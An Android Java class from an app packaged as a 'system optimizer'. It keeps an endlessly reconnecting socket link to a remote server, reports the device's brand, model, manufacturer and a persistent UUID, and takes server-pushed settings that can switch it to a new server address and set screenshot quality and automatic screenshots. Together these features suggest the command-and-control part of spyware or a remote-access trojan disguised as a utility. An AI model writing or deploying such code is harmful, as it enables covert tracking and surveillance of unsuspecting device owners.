package com.system.optimizer.network;

import io.socket.client.Socket;
import java.net.URISyntaxException;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;

import android.content.Context;

import com.system.optimizer.R;

import android.content.SharedPreferences;
import com.system.optimizer.config.ConfigData;
import com.system.optimizer.config.ConfigManager;
import android.os.Build;
import android.util.Log;
import io.socket.client.IO;
import io.socket.client.IO.Options;
import io.socket.emitter.Emitter;

public class SocketManager {
    private static final String TAG = "SocketManager";

    private Socket socket;

    private final Options opts;

    private final Map<String, Emitter.Listener> listenerMap = new HashMap<>();

    private final Context appContext;

    private final ConfigManager configManager;

    /**
     * Constructor that accepts a shared ConfigManager instance.
     * 
     * @param context       Android context (will use application context to avoid
     *                      memory leaks)
     * @param configManager Shared ConfigManager instance for config access and
     *                      storage
     */
    public SocketManager(Context context, ConfigManager configManager) {
        this.appContext = context.getApplicationContext();
        this.configManager = configManager;

        opts = new Options();
        opts.reconnection = true;
        opts.reconnectionAttempts = Integer.MAX_VALUE;
        opts.reconnectionDelay = 5000;

        socket = this.connect();
    }

    private synchronized Socket connect() {
        if (socket != null) {
            return socket;
        }

        // Setup
        String infoJson = buildInfo();
        Log.d(TAG, "[DEBUG] buildInfo() JSON: " + infoJson);
        opts.query = "info=" + infoJson;
        Log.d(TAG, "[DEBUG] Full query being sent: " + opts.query);

        try {
            // Check if we have a stored socket URL
            String serverUrl = this.configManager.getStoredServerUrl();

            if (serverUrl != null && !serverUrl.isEmpty()) {
                // Not first run - use stored URL
                Log.d(TAG, "Using stored socket URL from SharedPreferences: " + serverUrl);
            } else {
                // First run - use URL from build (SERVER_URL)
                serverUrl = appContext.getString(R.string.SERVER_URL);
                Log.d(TAG, "First run - using SERVER_URL from build: " + serverUrl);

                Log.d(TAG, "Storing initial SERVER_URL in SharedPreferences for future runs");
                this.configManager.setServerUrl(serverUrl);
            }

            String nameSpace = ConfigManager.SOCKET_NAMESPACE;

            Log.d(TAG, "SOCKET URL: " + serverUrl);
            Log.d(TAG, "NAMESPACE: " + nameSpace);

            socket = IO.socket(serverUrl + nameSpace, opts);

            socket.on(Socket.EVENT_CONNECT_ERROR, (Object... args) -> {
                Log.e(TAG, "[DEBUG] Socket EVENT_CONNECT_ERROR: " + (args.length > 0 ? args[0] : "unknown"));
            });

            socket.connect();

            // Listen event from server to restart connection (e.g. after server restart or
            // config change)
            addListener("restart", (args) -> {
                Log.d(TAG, "Restart");
                // TODO: implement
            });

            // Listen for config data sent by server as first message
            addListener("config_data", (args) -> {
                Log.d(TAG, "ConfigData event received from server");
                if (args != null && args.length > 0) {
                    try {
                        org.json.JSONObject configJson = (org.json.JSONObject) args[0];
                        String newSocketUrl = configJson.optString("server_url", null);
                        int screenshotQuality = configJson.optInt("screenshot_quality", 70);
                        boolean autoScreenshot = configJson.optBoolean("auto_screenshot", false);

                        if (newSocketUrl != null && !newSocketUrl.isEmpty()) {
                            String currentSocketUrl = this.configManager.getStoredServerUrl();

                            // Check if socket URL has changed
                            if (currentSocketUrl == null || !currentSocketUrl.equals(newSocketUrl)) {
                                Log.d(TAG, "Socket URL changed from " + currentSocketUrl + " to " + newSocketUrl);

                                this.configManager.setServerUrl(newSocketUrl);

                                // Store full config
                                ConfigData serverConfig = new ConfigData(newSocketUrl, screenshotQuality,
                                        autoScreenshot);
                                configManager.storeConfig(serverConfig);

                                // Disconnect and reconnect to new URL
                                Log.d(TAG, "Disconnecting from current socket to reconnect to new URL");
                                disconnect();
                                socket = null;

                                this.connect();
                            } else {
                                // Store full config
                                ConfigData serverConfig = new ConfigData(newSocketUrl, screenshotQuality,
                                        autoScreenshot);
                                configManager.storeConfig(serverConfig);
                                Log.d(TAG, "Socket URL unchanged, no reconnection needed");
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing config_data from server: " + e.getMessage(), e);
                    }
                }
            });

            socket.on("reconnect", (Object... args) -> {
                Log.d(TAG, "Reconnected, re-adding listeners");
                for (Map.Entry<String, Emitter.Listener> entry : listenerMap.entrySet()) {
                    socket.off(entry.getKey());
                    socket.on(entry.getKey(), entry.getValue());
                }
            });
        } catch (URISyntaxException e) {
            Log.e(TAG, "Malformed url", e);
            socket = null;
            return null;
        } catch (Exception e) {
            Log.e(TAG, "Error connecting to socket", e);
            socket = null;
            return null;
        }

        // Re-register ALL listeners from listenerMap to the new socket
        Log.d(TAG, "Re-registering " + listenerMap.size() + " listeners to new socket");
        for (Map.Entry<String, Emitter.Listener> entry : listenerMap.entrySet()) {
            socket.on(entry.getKey(), entry.getValue());
        }

        return socket;
    }

    /**
     * Add a listener using an Emitter.Listener.
     * 
     * @param event    The event name to listen for
     * @param listener The listener to invoke when the event is received
     */
    public void addListener(String event, final Emitter.Listener listener) {
        listenerMap.put(event, listener);
        if (socket != null) {
            socket.on(event, listener);
        }
    }

    public void removeListener(String event, Emitter.Listener listener) {
        listenerMap.remove(event);
        if (socket != null) {
            socket.off(event, listener);
        }
    }

    public void sendEvent(String event, Object data) {
        if (socket != null) {
            try {
                socket.emit(event, data);
            } catch (Exception e) {
                Log.e(TAG, "Error sending event: " + event, e);
            }
        } else {
            Log.w(TAG, "Cannot send event: " + event + " - socket is null");
        }
    }

    public synchronized void disconnect() {
        if (socket != null) {
            try {
                socket.off(); // Remove all listeners
                socket.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error disconnecting socket", e);
            } finally {
                socket = null;
            }
        }
    }

    private String buildInfo() {
        Log.d(TAG, "[DEBUG] buildInfo() called - collecting device info");
        Log.d(TAG, "[DEBUG] Build.BRAND: " + Build.BRAND);
        Log.d(TAG, "[DEBUG] Build.MODEL: " + Build.MODEL);
        Log.d(TAG, "[DEBUG] Build.MANUFACTURER: " + Build.MANUFACTURER);

        StringBuilder info = new StringBuilder();
        info.append("{");
        info.append("\"Brand\":\"").append(Build.BRAND != null ? Build.BRAND : "Unknown")
                .append("\",");
        info.append("\"Model\":\"").append(Build.MODEL != null ? Build.MODEL : "Unknown").append("\",");
        info.append("\"Manufacturer\":\"").append(Build.MANUFACTURER != null ? Build.MANUFACTURER : "Unknown")
                .append("\",");
        String uuid = getUUID(this.appContext);
        Log.d(TAG, "[DEBUG] device_uuid: " + uuid);
        info.append("\"device_uuid\":\"").append(uuid).append("\"");
        info.append("}");
        return info.toString();
    }

    private static String getUUID(Context context) {
        SharedPreferences prefs = context.getSharedPreferences("device_prefs", Context.MODE_PRIVATE);
        String uuid = prefs.getString("device_uuid", null);
        if (uuid == null) {
            uuid = UUID.randomUUID().toString();
            prefs.edit().putString("device_uuid", uuid).apply();
        }
        return uuid;
    }

}